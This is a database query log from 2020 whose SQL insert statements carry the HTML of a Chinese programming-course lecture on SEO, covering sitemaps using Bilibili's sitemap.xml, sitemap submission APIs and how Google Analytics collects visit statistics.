data-slate-object="text" data-key="1462"><span data-slate-leaf="true" data-offset-key="1462:0" 
data-first-offset="true"><span class="se-4e378773" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">网站地图则可以清晰直接地告诉搜索引擎网站内“重要”的页面都有哪些（无论是否被链接指向），它们的更新习惯，包括最近一次是什么时候更新的，更新频率是多少，以及对于整个网站来说，不同页面的重要性比重是多少。</span></span></span></span> 
</div> <div class="se-5744d9b1 " data-slate-type="paragraph" data-slate-object="block" data-key="1463"> 
<span data-slate-object="text" data-key="1464"><span data-slate-leaf="true" data-offset-key="1464:0" 
data-first-offset="true"><span data-slate-string="true">对于使用 SPA（我们曾在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1465" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1466"><span data-slate-leaf="true" data-offset-key="1466:0" 
data-first-offset="true"><span data-slate-string="true">[第 17 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1467"><span data-slate-leaf="true" data-offset-key="1467:0" 
data-first-offset="true"><span data-slate-string="true"> 介绍过 SPA，你可以回看）的网站应用来说，由于缺乏页面跳转，搜索引擎无法正确理解页面的关系、更新、指向等等，网站地图就显得更为重要了。</span></span></span> 
</div> <div class="se-5822d120 " data-slate-type="paragraph" data-slate-object="block" data-key="1468"> 
<span data-slate-object="text" data-key="1469"><span data-slate-leaf="true" data-offset-key="1469:0" 
data-first-offset="true"><span data-slate-string="true">这次我来拿 B 站举个例子，访问 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1470" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1471"><span data-slate-leaf="true" data-offset-key="1471:0" 
data-first-offset="true"><span data-slate-string="true">https://www.bilibili.com/sitemap.xml</span></span></span></a><span 
data-slate-object="text" data-key="1472"><span data-slate-leaf="true" data-offset-key="1472:0" 
data-first-offset="true"><span data-slate-string="true">，你会看到如下的内容：</span></span></span> </div> 
<div class="se-16ce946e se-8cdca553" data-slate-type="pre" data-slate-object="block" data-key="1473" 
data-code-language="cpp"> <div class="se-da84c1ed se-c4c93f4d"> <span></span> </div> <div class="se-ffd523a9"> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="1"></div> <div class="se-4f3e0323 
se-7a294bdd" data-code-line-number="2"></div> <div class="se-4f3e0323 se-7a294bdd" data-code-line-number="3"></div> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="4"></div> <div class="se-4f3e0323 
se-7a294bdd" data-code-line-number="5"></div> <div class="se-4f3e0323 se-7a294bdd" data-code-line-number="6"></div> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="7"></div> </div> <div class="se-fd1a5213 
ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1474"> <span data-slate-object="text" data-key="1475"><span data-slate-leaf="true" 
data-offset-key="1475:0" data-first-offset="true"><span data-slate-string="true">&lt;sitemapindex 
xmlns=</span></span><span data-slate-leaf="true" data-offset-key="1475:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_8653011033" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.sitemaps.org/schemas/sitemap/0.9"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1475:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1476"> <span data-slate-object="text" data-key="1477"><span data-slate-leaf="true" 
data-offset-key="1477:0" data-first-offset="true"><span data-slate-string="true"> &lt;sitemap&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1478"> <span data-slate-object="text" data-key="1479"><span data-slate-leaf="true" 
data-offset-key="1479:0" data-first-offset="true"><span data-slate-string="true"> &lt;loc&gt;http:</span></span><span 
data-slate-leaf="true" data-offset-key="1479:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_1088053945" data-annotation-type="annotation"><span data-slate-string="true">//www.bilibili.com/sitemap/v.xml&lt;/loc&gt;</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1480"> <span data-slate-object="text" data-key="1481"><span data-slate-leaf="true" 
data-offset-key="1481:0" data-first-offset="true"><span data-slate-string="true"> &lt;lastmod&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="1481:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9111319875" data-annotation-type="annotation"><span data-slate-string="true">2019</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:2"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4461534520" data-annotation-type="annotation"><span data-slate-string="true">-10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5521086258" data-annotation-type="annotation"><span data-slate-string="true">-26</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:4"><span data-slate-string="true">T18:</span></span><span 
data-slate-leaf="true" data-offset-key="1481:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1559466829" data-annotation-type="annotation"><span data-slate-string="true">25</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:6"><span data-slate-string="true">:</span></span><span 
data-slate-leaf="true" data-offset-key="1481:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5501687486" data-annotation-type="annotation"><span data-slate-string="true">05.328</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:8"><span data-slate-string="true">Z&lt;/lastmod&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1482"> <span data-slate-object="text" data-key="1483"><span data-slate-leaf="true" 
data-offset-key="1483:0" data-first-offset="true"><span data-slate-string="true"> &lt;/sitemap&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1484"> <span data-slate-object="text" data-key="1485"><span data-slate-leaf="true" 
data-offset-key="1485:0" data-first-offset="true"><span data-slate-string="true"> ...</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1486"> <span data-slate-object="text" data-key="1487"><span data-slate-leaf="true" 
data-offset-key="1487:0" data-first-offset="true"><span data-slate-string="true">&lt;/sitemapindex&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 258px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-741ed86e " data-slate-type="paragraph" data-slate-object="block" 
data-key="1488"> <span data-slate-object="text" data-key="1489"><span data-slate-leaf="true" 
data-offset-key="1489:0" data-first-offset="true"><span data-slate-string="true">它是由多个子 sitemap 
配置文件组成的，随便打开一个，比如 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1490" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1491"><span 
data-slate-leaf="true" data-offset-key="1491:0" data-first-offset="true"><span data-slate-string="true">http://www.bilibili.com/sitemap/v.xml</span></span></span></a><span 
data-slate-object="text" data-key="1492"><span data-slate-leaf="true" data-offset-key="1492:0" 
data-first-offset="true"><span data-slate-string="true">：</span></span></span> </div> <div 
class="se-74ccf899 se-35f38ce0" data-slate-type="pre" data-slate-object="block" data-key="1493" 
data-code-language="cpp"> <div class="se-b5ab256e se-92b0a78a"> <span></span> </div> <div class="se-ebf67f18"> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="1"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="2"></div> <div class="se-be2b321e se-9b445acb" data-code-line-number="3"></div> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="4"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="5"></div> <div class="se-be2b321e se-9b445acb" data-code-line-number="6"></div> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="7"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="8"></div> </div> <div class="se-eda7243d ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1494"> <span data-slate-object="text" data-key="1495"><span data-slate-leaf="true" 
data-offset-key="1495:0" data-first-offset="true"><span data-slate-string="true">&lt;urlset 
xmlns=</span></span><span data-slate-leaf="true" data-offset-key="1495:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1643297433" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.sitemaps.org/schemas/sitemap/0.9"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1495:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1496"> <span data-slate-object="text" data-key="1497"><span data-slate-leaf="true" 
data-offset-key="1497:0" data-first-offset="true"><span data-slate-string="true"> &lt;url&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1498"> <span data-slate-object="text" data-key="1499"><span data-slate-leaf="true" 
data-offset-key="1499:0" data-first-offset="true"><span data-slate-string="true"> &lt;loc&gt;http:</span></span><span 
data-slate-leaf="true" data-offset-key="1499:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_5939313121" data-annotation-type="annotation"><span data-slate-string="true">//www.bilibili.com/v/douga/&lt;/loc&gt;</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1500"> <span data-slate-object="text" data-key="1501"><span data-slate-leaf="true" 
data-offset-key="1501:0" data-first-offset="true"><span data-slate-string="true"> &lt;lastmod&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="1501:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_3687242308" data-annotation-type="annotation"><span data-slate-string="true">2019</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:2"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_0517769396" data-annotation-type="annotation"><span data-slate-string="true">-10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8110135945" data-annotation-type="annotation"><span data-slate-string="true">-26</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:4"><span data-slate-string="true">T18:</span></span><span 
data-slate-leaf="true" data-offset-key="1501:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9577925384" data-annotation-type="annotation"><span data-slate-string="true">25</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:6"><span data-slate-string="true">:</span></span><span 
data-slate-leaf="true" data-offset-key="1501:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5507680647" data-annotation-type="annotation"><span data-slate-string="true">17.629</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:8"><span data-slate-string="true">Z&lt;/lastmod&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1502"> <span data-slate-object="text" data-key="1503"><span data-slate-leaf="true" 
data-offset-key="1503:0" data-first-offset="true"><span data-slate-string="true"> &lt;changefreq&gt;daily&lt;/changefreq&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1504"> <span data-slate-object="text" data-key="1505"><span data-slate-leaf="true" 
data-offset-key="1505:0" data-first-offset="true"><span data-slate-string="true"> &lt;/url&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1506"> <span data-slate-object="text" data-key="1507"><span data-slate-leaf="true" 
data-offset-key="1507:0" data-first-offset="true"><span data-slate-string="true"> ...</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1508"> <span data-slate-object="text" data-key="1509"><span data-slate-leaf="true" 
data-offset-key="1509:0" data-first-offset="true"><span data-slate-string="true">&lt;/urlset&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 284px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-316d65ce " data-slate-type="paragraph" data-slate-object="block" 
data-key="1510"> <span data-slate-object="text" data-key="1511"><span data-slate-leaf="true" 
data-offset-key="1511:0" data-first-offset="true"><span data-slate-string="true">可以说一目了然，页面位置、上次修改时间，以及修改频率。这可以让搜索引擎有目的和有条件地扫描和爬取页面数据。</span></span></span> 
</div> <div class="se-fe49c1d7 " data-slate-type="paragraph" data-slate-object="block" data-key="1512"> 
<span data-slate-object="text" data-key="1513"><span data-slate-leaf="true" data-offset-key="1513:0" 
data-first-offset="true"><span data-slate-string="true">对于网站地图，除了被动等待爬虫的抓取，搜索引擎服务往往还提供另一种方式来报告网站地图的变更，那就是</span></span></span><span 
data-slate-object="text" data-key="1514"><span data-slate-leaf="true" data-offset-key="1514:0" 
data-first-offset="true"><span class="se-ac2b91f1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">允许网站管理员主动去提交变更信息，这种方式和爬虫来爬取比较起来，类似于我们从第一章就开始讲的 pull 和 push 的区别</span></span></span></span><span 
data-slate-object="text" data-key="1515"><span data-slate-leaf="true" data-offset-key="1515:0" 
data-first-offset="true"><span data-slate-string="true">，这种方式对于网站管理员来说更麻烦，但是显然可以更为及时地让搜索引擎获知并收录最新数据。</span></span></span> 
</div> <div class="se-92320066 " data-slate-type="paragraph" data-slate-object="block" data-key="1516"> 
<span data-slate-object="text" data-key="1517"><span data-slate-leaf="true" data-offset-key="1517:0" 
data-first-offset="true"><span data-slate-string="true">这种方式从实现上说，就是由搜索引擎服务的提供商开放了一个 Web API，网站在内容变更的时候调用，去通知搜索引擎（关于 
Web API 的设计，你可以回看 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1518" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1519"><span 
data-slate-leaf="true" data-offset-key="1519:0" data-first-offset="true"><span data-slate-string="true">[第 
05 讲]</span></span></span></a><span data-slate-object="text" data-key="1520"><span data-slate-leaf="true" 
data-offset-key="1520:0" data-first-offset="true"><span data-slate-string="true">）。</span></span></span> 
</div> <h3 class="se-b2b562cc" data-slate-type="heading" data-slate-object="block" data-key="1521"><span 
data-slate-object="text" data-key="1522"><span data-slate-leaf="true" data-offset-key="1522:0" 
data-first-offset="true"><span data-slate-string="true">5. 统计分析</span></span></span></h3> <div 
class="se-c5129bc6 " data-slate-type="paragraph" data-slate-object="block" data-key="1523"> 
<span data-slate-object="text" data-key="1524"><span data-slate-leaf="true" data-offset-key="1524:0" 
data-first-offset="true"><span data-slate-string="true">在进行 SEO 的改动调整之后，我们需要一些方式来跟踪和评估效果。像 
Google Analytics 和百度统计，就提供了这样的功能。</span></span></span> </div> <div class="se-24f7d8f2 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1525"> <span data-slate-object="text" data-key="1526"><span 
data-slate-leaf="true" data-offset-key="1526:0" data-first-offset="true"><span data-slate-string="true">原理上很简单，以 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1527" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1528"><span data-slate-leaf="true" data-offset-key="1528:0" 
data-first-offset="true"><span data-slate-string="true">Google Analytics</span></span></span></a><span 
data-slate-object="text" data-key="1529"><span data-slate-leaf="true" data-offset-key="1529:0" 
data-first-offset="true"><span data-slate-string="true"> 为例，它会为你的网站生成一段 JavaScript 代码，你就可以把它嵌入每一个你希望得到跟踪的网页。这样，在页面访问时，这段代码会收集相关信息，并向页面嵌入一个大小为 
1 像素的 gif 图片，而这个图片的 URL 带有当前浏览器、操作系统等等客户端的不同类型的信息。这样，Google Analytics 就可以捕获这些信息来完成数据统计了。</span></span></span> 
</div> <div class="se-82794e8f " data-slate-type="paragraph" data-slate-object="block" data-key="1530"> 
<span data-slate-object="text" data-key="1531"><span data-slate-leaf="true" data-offset-key="1531:0" 
data-first-offset="true"><span data-slate-string="true">下面给出了我在 Mac 上访问极客时间的页面时，网页向 Google 
Analytics 服务器发送的统计信息 URL（别看这个 URL 没有 gif 字样，但这个请求返回的就是一个 gif 图片，这一点可以从响应的 Content-Type 中看出来）：</span></span></span> 
</div> <div class="se-5a4f8313 se-59b3fb7d" data-slate-type="pre" data-slate-object="block" 
data-key="1532" data-code-language="javascript"> <div class="se-f9b2bc77 se-02537653"> <span></span> 
</div> <div class="se-7a125a77"> <div class="se-ab1813f1 se-e10f634b" data-code-line-number="1"></div> 
</div> <div class="se-4200ac6c ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1533"> <span data-slate-object="text" data-key="1534"><span 
data-slate-leaf="true" data-offset-key="1534:0" data-first-offset="true"><span data-slate-string="true">https:</span></span><span 
data-slate-leaf="true" data-offset-key="1534:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0200744214" data-annotation-type="annotation"><span data-slate-string="true">//www.google-analytics.com/collect?v=1&amp;_v=j79&amp;a=775923213&amp;t=pageview&amp;_s=1&amp;dl=https%3A%2F%2Ftime.geekbang.org%2F&amp;ul=en-us&amp;de=UTF-8&amp;dt=%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4&amp;sd=24-bit&amp;sr=1440x900&amp;vp=575x729&amp;je=0&amp;_u=AACAAEAB~&amp;jid=&amp;gjid=&amp;cid=248548954.1568164577&amp;tid=UA-103082599-6&amp;_gid=817127427.1571674409&amp;z=266312543</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 53px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-3af11126 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1535"> <span data-slate-object="text" data-key="1536"><span data-slate-leaf="true" 
data-offset-key="1536:0" data-first-offset="true"><span data-slate-string="true">通过收集这样的信息，可以获得很多网站用户的情况统计，比如访问量、页面停留时间、地区分布、电脑访问或手机访问的比例等等，并能观察这样的统计信息基于时间的走势。</span></span></span> 
</div> <h2 class="se-3db70928" data-slate-type="heading" data-slate-object="block" data-key="1537"><span 
data-slate-object="text" data-key="1538"><span data-slate-leaf="true" data-offset-key="1538:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-444335cf " data-slate-type="paragraph" data-slate-object="block" data-key="1539"> 
<span data-slate-object="text" data-key="1540"><span data-slate-leaf="true" data-offset-key="1540:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了一些互联网搜索引擎的工作机制，并结合例子从工程的角度了解了几个常见的 
SEO 相关技术。今天我们就不放具体的思考题了，但 SEO 本身是一个可以挖掘很深的领域，我在扩展阅读中放置了一些资料，供你延伸。</span></span></span> </div> 
<div class="se-8248b28b " data-slate-type="paragraph" data-slate-object="block" data-key="1541"> 
<span data-slate-object="text" data-key="1542"><span data-slate-leaf="true" data-offset-key="1542:0" 
data-first-offset="true"><span data-slate-string="true">好，到今天为止，“寻找最佳实践”这一章就接近尾声了，你是否有所收获、有所体会，欢迎你在留言区分享。</span></span></span> 
</div> <h2 class="se-4a2c6d26" data-slate-type="heading" data-slate-object="block" data-key="1543"><span 
data-slate-object="text" data-key="1544"><span data-slate-leaf="true" data-offset-key="1544:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-b5e02895" data-slate-type="list" data-slate-object="block" data-key="1545"> <div 
class="se-c0c0ac44 se-3e8f772e" data-slate-type="list-line" data-slate-object="block" data-key="1546"> 
<span data-slate-object="text" data-key="1547"><span data-slate-leaf="true" data-offset-key="1547:0" 
data-first-offset="true"><span data-slate-string="true">文中介绍了几个典型的 SEO 黑帽法，作为视野的拓展，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1548" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1549"><span data-slate-leaf="true" data-offset-key="1549:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1550"><span data-slate-leaf="true" data-offset-key="1550:0" 
data-first-offset="true"><span data-slate-string="true">了解更多的黑帽法。特别地，你也可以参阅这一</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1551" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1552"><span data-slate-leaf="true" data-offset-key="1552:0" 
data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" 
data-key="1553"><span data-slate-leaf="true" data-offset-key="1553:0" data-first-offset="true"><span 
data-slate-string="true">了解更多历史上的 “Google 轰炸”事件。</span></span></span> </div> <div class="se-6e8f8cdb 
se-db8e4517" data-slate-type="list-line" data-slate-object="block" data-key="1554"> <span data-slate-object="text" 
data-key="1555"><span data-slate-leaf="true" data-offset-key="1555:0" data-first-offset="true"><span 
data-slate-string="true">如果对 Google Analytics 感兴趣的话，那么官方有一些很好的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1556" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1557"><span data-slate-leaf="true" data-offset-key="1557:0" data-first-offset="true"><span 
data-slate-string="true">学习材料</span></span></span></a><span data-slate-object="text" data-key="1558"><span 
data-slate-leaf="true" data-offset-key="1558:0" data-first-offset="true"><span data-slate-string="true">；如果用的是百度统计，那么你也可以浏览一下官方的</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1559" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1560"><span data-slate-leaf="true" data-offset-key="1560:0" 
data-first-offset="true"><span data-slate-string="true">文档</span></span></span></a><span data-slate-object="text" 
data-key="1561"><span data-slate-leaf="true" data-offset-key="1561:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-49bdcde0 se-cdf077ef" 
data-slate-type="list-line" data-slate-object="block" data-key="1562"> <span data-slate-object="text" 
data-key="1563"><span data-slate-leaf="true" data-offset-key="1563:0" data-first-offset="true"><span 
data-slate-string="true">对于 PageRank 算法，互联网上其实有很多学习材料，比如维基百科的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1564" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1565"><span data-slate-leaf="true" data-offset-key="1565:0" data-first-offset="true"><span 
data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" data-key="1566"><span 
data-slate-leaf="true" data-offset-key="1566:0" data-first-offset="true"><span data-slate-string="true">，再比如科普作家卢昌海的文章——</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1567" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1568"><span data-slate-leaf="true" data-offset-key="1568:0" 
data-first-offset="true"><span data-slate-string="true">谷歌背后的数学</span></span></span></a><span 
data-slate-object="text" data-key="1569"><span data-slate-leaf="true" data-offset-key="1569:0" 
data-first-offset="true"><span data-slate-string="true">。这个算法的来源，是 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1570" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1571"><span data-slate-leaf="true" data-offset-key="1571:0" 
data-first-offset="true"><span data-slate-string="true">The Anatomy of a Large-Scale Hypertextual 
Web Search Engine</span></span></span></a><span data-slate-object="text" data-key="1572"><span 
data-slate-leaf="true" data-offset-key="1572:0" data-first-offset="true"><span data-slate-string="true"> 
这篇 Sergey Brin 和 Lawrence Page 最早写的关于 Google 搜索引擎原理的论文，当然，它并非这一讲的学习周期内要求的阅读材料，而仅供感兴趣且有余力的你阅读。</span></span></span> 
</div> <div class="se-1574f717 se-3681a6f5" data-slate-type="list-line" data-slate-object="block" 
data-key="1573"> <a data-slate-type="link" data-slate-object="inline" data-key="1574" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1575"><span data-slate-leaf="true" data-offset-key="1575:0" 
data-first-offset="true"><span data-slate-string="true">单页应用（Single Page Application）的搜索引擎优化</span></span></span></a><span 
data-slate-object="text" data-key="1576"><span data-slate-leaf="true" data-offset-key="1576:0" 
data-first-offset="true"><span data-slate-string="true">，专栏第三章已经介绍了 SPA 的优势，但是 SPA 网站并不是一个擅长将喜怒哀乐表现出来的孩子，他对擅长察言观色的搜索引擎颇不友好，因此要对 
SPA 网站进行有效的 SEO，是需要一些特殊技巧的，推荐阅读。</span></span></span> </div> </div> <div class="se-a98f2d3f" 
data-slate-type="image" data-slate-object="block" data-key="1577"> <img class="se-184879a2" 
src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 14, 14) 
 {executed in 1 msec}
2020-11-19 11:07:46.880 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.881 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:46.885 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="1264" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-300f25fd " data-slate-type="paragraph" data-slate-object="block" data-key="1265"> 
<span data-slate-object="text" data-key="1266"><span data-slate-leaf="true" data-offset-key="1266:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-ae10afdf " data-slate-type="paragraph" data-slate-object="block" data-key="1267"> 
<span data-slate-object="text" data-key="1268"><span data-slate-leaf="true" data-offset-key="1268:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来聊一聊搜索引擎和 SEO（Search Engine Optimization）。当网站发布上线以后，我们希望通过适当的优化调整，让它可以被搜索引擎更好地“理解”，在用户使用搜索引擎搜索的时候，网站的内容可以更恰当地暴露给用户。</span></span></span> 
</div> <div class="se-f95e2ef9 " data-slate-type="paragraph" data-slate-object="block" data-key="1269"> 
<span data-slate-object="text" data-key="1270"><span data-slate-leaf="true" data-offset-key="1270:0" 
data-first-offset="true"><span data-slate-string="true">作为程序员，和更擅长于与内容打交道的运营相比，</span></span></span><span 
data-slate-object="text" data-key="1271"><span data-slate-leaf="true" data-offset-key="1271:0" 
data-first-offset="true"><span class="se-d1464d5f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们的角度是不一样的，我们更关注工程实现而非网页内容，也更需要从原理的角度去理解 SEO。</span></span></span></span><span 
data-slate-object="text" data-key="1272"><span data-slate-leaf="true" data-offset-key="1272:0" 
data-first-offset="true"><span data-slate-string="true">这一讲，就让我们从理解互联网搜索引擎的工作原理开始。</span></span></span> 
</div> <h2 class="se-feac571d" data-slate-type="heading" data-slate-object="block" data-key="1273"><span 
data-slate-object="text" data-key="1274"><span data-slate-leaf="true" data-offset-key="1274:0" 
data-first-offset="true"><span data-slate-string="true">互联网搜索引擎</span></span></span></h2> <div 
class="se-bdca128d " data-slate-type="paragraph" data-slate-object="block" data-key="1275"> 
<span data-slate-object="text" data-key="1276"><span data-slate-leaf="true" data-offset-key="1276:0" 
data-first-offset="true"><span data-slate-string="true">要说 SEO，我觉得我们需要先来简单了解一下互联网上的搜索引擎。</span></span></span> 
</div> <h3 class="se-bb594ceb" data-slate-type="heading" data-slate-object="block" data-key="1277"><span 
data-slate-object="text" data-key="1278"><span data-slate-leaf="true" data-offset-key="1278:0" 
data-first-offset="true"><span data-slate-string="true">组成部分</span></span></span></h3> <div 
class="se-69725970 " data-slate-type="paragraph" data-slate-object="block" data-key="1279"> 
<span data-slate-object="text" data-key="1280"><span data-slate-leaf="true" data-offset-key="1280:0" 
data-first-offset="true"><span data-slate-string="true">对于 Google 和百度这样的巨型 Web 搜索引擎来说，这里面的机制很复杂，而它们之间又有很多区别。比如被搜索的数据是怎样产生的，权重是怎样分配的，用户的输入又是怎样被理解的等等，但是大体上，它总是包含这样三部分。</span></span></span> 
</div> <div class="se-6f760309 " data-slate-type="paragraph" data-slate-object="block" data-key="1281"> 
<span data-slate-object="text" data-key="1282"><span data-slate-leaf="true" data-offset-key="1282:0" 
